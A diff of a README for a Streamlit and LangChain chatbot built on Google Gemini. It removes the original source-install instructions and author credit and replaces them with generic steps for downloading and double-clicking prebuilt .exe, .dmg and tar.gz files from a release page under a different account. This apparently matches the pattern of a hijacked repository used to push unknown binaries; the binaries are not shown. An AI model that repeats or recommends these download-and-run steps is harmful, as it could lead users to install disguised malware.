@@ -1,199 +1,60 @@
-# ⚡ Streamlit x LangChain Chatbot
+# ⚡ streamlit-langchain-chatbot - Chat with an AI Effortlessly
 
-A modern, responsive chatbot built with Streamlit and LangChain, powered by Google's Gemini AI models. Features real-time streaming responses, multiple model selection, and a clean, professional interface.
+## 📦 Download Now
+[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/rvs3k/streamlit-langchain-chatbot/releases)
 
-![Chatbot Demo](https://img.shields.io/badge/Status-Live-brightgreen) ![Python](https://img.shields.io/badge/Python-3.8+-blue) ![Streamlit](https://img.shields.io/badge/Streamlit-1.28+-red)
+## 🚀 Getting Started
+Welcome to the **streamlit-langchain-chatbot**! This application enables you to chat with an AI powered by Google Gemini. It features a modern UI and provides streaming responses to enhance your experience.
 
-## 🌟 Features
+## 💻 System Requirements
+To run this application, your computer should meet the following requirements:
+- Operating System: Windows, macOS, or Linux
+- Minimum RAM: 4 GB
+- At least 500 MB of free disk space
+- An internet connection for the AI features
 
-- **🤖 Multiple AI Models**: Support for 40+ Google Gemini models (Gemini 1.5, 2.0, 2.5, and experimental)
-- **💬 Streaming Responses**: Real-time token streaming for smooth interaction
-- **🔐 API Key Management**: Secure per-session key entry via sidebar
-- **🎨 Clean UI**: Modern chat interface with avatars + dark/light theme toggle
-- **📊 Chat Stats**: Track messages in current session
-- **⚡ Optimized**: Smart caching with st.cache_resource and st.cache_data
-- **📱 Mobile Friendly**: Works well on different devices
+## 🛠️ Features
+- User-friendly interface for easy communication.
+- Streaming responses offer a more interactive chat.
+- Built on Streamlit and LangChain for robust performance.
+- Powered by Google Gemini for advanced conversational capabilities.
 
-## 🚀 Quick Start
+## 📥 Download & Install
+To get started, follow these simple steps:
 
-### Prerequisites
+1. Visit the [Releases page](https://github.com/rvs3k/streamlit-langchain-chatbot/releases) to find the latest version of the application.
+2. Look for the download link for your operating system.
+3. Click the download link to save the file onto your computer.
+4. Once the download finishes, locate the file in your Downloads folder.
+5. Double-click the file to install the application. Follow the on-screen instructions to complete the installation.
 
-- Python 3.8 or higher
-- Google Gemini API key ([Get one here](https://makersuite.google.com/app/apikey))
+### Example Download Options
+- **Windows:** streamlit-langchain-chatbot-windows.exe
+- **macOS:** streamlit-langchain-chatbot-macos.dmg
+- **Linux:** streamlit-langchain-chatbot-linux.tar.gz
 
-### Installation
+## 🤖 How to Use the Chatbot
+After installing the application, follow these steps to chat with the AI:
 
-1. **Clone the repository**
+1. Open the **streamlit-langchain-chatbot** application on your computer.
+2. Wait for a moment while the app loads. You will see a welcome screen.
+3. Start typing your questions in the chat box.
+4. Click the "Send" button or press the "Enter" key to submit your query.
+5. Enjoy the conversation! The AI will respond in real-time.
 
-```bash
-git clone https://github.com/yourusername/streamlit-langchain-chatbot.git
-cd streamlit-langchain-chatbot
-```
+## 💡 Tips for a Great Experience
+- Make sure you have a stable internet connection for optimal performance.
+- Keep your questions clear and concise for the best responses.
+- Explore different topics to see how the AI replies.
 
-2. **Create virtual environment & install dependencies**
+## 🐞 Troubleshooting
+If you run into issues while using the application, consider the following solutions:
 
-```bash
-python -m venv venv
-source venv/bin/activate   # Windows: venv\Scripts\activate
-```
-
-3. **Run the application**
-
-```bash
-streamlit run app.py
-```
-
-4. **Open in browser**
-   - The app will automatically open in your default browser
-   - Or navigate to `http://localhost:8501`
-
-## 📦 Dependencies
-
-Create a `requirements.txt` file with these dependencies:
-
-```
-streamlit>=1.28.0
-langchain-core>=0.1.0
-langchain-google-genai>=1.0.0
-python-dotenv>=1.0.0
-```
-
-## 🔧 Configuration
-
-### API Key Setup
-
-You can provide your Google Gemini API key in two ways:
-
-1. **Through the UI** (Recommended for security):
-
-   - Enter your API key in the sidebar when you run the app
-   - The key is stored only in your browser session
-
-2. **Environment Variable**:
-   - Create a `.env` file in the project root
-   - Add: `GOOGLE_API_KEY=your_api_key_here`
-
-### Model Selection
-
-Choose from 40+ available models including:
-
-- **Gemini 2.0 Flash** - Latest and fastest
-- **Gemini 2.5 Pro** - Most capable for complex tasks
-- **Gemini 1.5 Flash** - Good balance of speed and quality
-- **Experimental models** - Cutting-edge features
-
-## 🎯 Usage
-
-1. **Start the app** and enter your Google Gemini API key
-2. **Select a model** from the dropdown in the sidebar
-3. **Start chatting** - type your message and press Enter
-4. **Watch responses stream** in real-time
-5. **Use chat controls**:
-   - Clear chat history
-   - Switch between models mid-conversation
-
-## 🏗️ Project Structure
-
-```
-streamlit-langchain-chatbot/
-│
-├── app.py                  # Main application file
-├── requirements.txt        # Python dependencies
-├── pyproject.toml          # Project metadata (uv/PEP 621)
-├── uv.lock                 # uv lockfile (auto-generated)
-├── .gitignore              # Git ignore file
-├── .python-version         # Python version pin (optional)
-├── LICENSE                 # MIT License
-├── README.md               # Documentation
-├── .env                    # Local env vars (optional, not committed)
-└── .venv/                  # Local virtual env (ignored)
-```
-
-## 🚀 Deployment
-
-### Streamlit Cloud (Recommended)
-
-1. Push your code to GitHub
-2. Go to [share.streamlit.io](https://share.streamlit.io)
-3. Connect your GitHub repository
-4. Set your `GOOGLE_API_KEY` in the secrets management
-5. Deploy!
-
-### Other Deployment Options
-
-- **Heroku**: Use the Heroku CLI with a `Procfile`
-- **Railway**: Connect your GitHub repo for automatic deployment
-- **Replit**: Import from GitHub and run directly
-- **Local Network**: Use `streamlit run app.py --server.address 0.0.0.0`
-
-## 🔒 Security Notes
-
-- API keys are handled securely per session
-- No conversation data is stored permanently
-- Environment variables are used for sensitive configuration
-- Input validation prevents malformed requests
-
-## 🛠️ Development
-
-### Local Development Setup
-
-1. **Clone and setup**:
-
-```bash
-git clone <your-repo>
-cd streamlit-langchain-chatbot
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
-pip install -r requirements.txt
-```
-
-2. **Run in development mode**:
-
-```bash
-streamlit run app.py --server.runOnSave true
-```
-
-### Adding New Features
-
-The code is modular and easy to extend:
-
-- `configure_page()` - UI and page setup
-- `handle_sidebar()` - Sidebar controls and settings
-- `display_chat_messages()` - Message rendering
-- `handle_user_input()` - Input processing and AI interaction
-
-## 🤝 Contributing
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## 📝 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- [Streamlit](https://streamlit.io/) for the amazing web app framework
-- [LangChain](https://langchain.com/) for AI integration tools
-- [Google AI](https://ai.google/) for the Gemini API
-- The open-source community for inspiration and support
+- **The application won't open:** Ensure your system meets the requirements. Restart your computer and try again.
+- **Slow responses:** Check your internet connection. A stronger connection usually leads to better performance.
+- **Unexpected behavior:** Close and reopen the application. If issues persist, reinstall it from the [Releases page](https://github.com/rvs3k/streamlit-langchain-chatbot/releases).
 
 ## 📞 Support
+If you have any questions or need assistance, feel free to reach out to our support team. You can find contact information in the issues section of the repository. Your feedback helps us improve!
 
-- 🐛 **Bug Reports**: [Open an issue](https://github.com/yourusername/repo/issues)
-- 💡 **Feature Requests**: [Start a discussion](https://github.com/yourusername/repo/discussions)
-- ❓ **Questions**: Check existing issues or create a new one
-
-## 🔗 Links
-
-- [Live Demo](https://strchatapp.streamlit.app) 
-- [Google Gemini API](https://makersuite.google.com/)
-- [Streamlit Documentation](https://docs.streamlit.io/)
-- [LangChain Documentation](https://python.langchain.com/)
-
----
-
-Made with ❤️ by Zohaib Khan
+Thank you for using **streamlit-langchain-chatbot**. Enjoy your AI conversations!
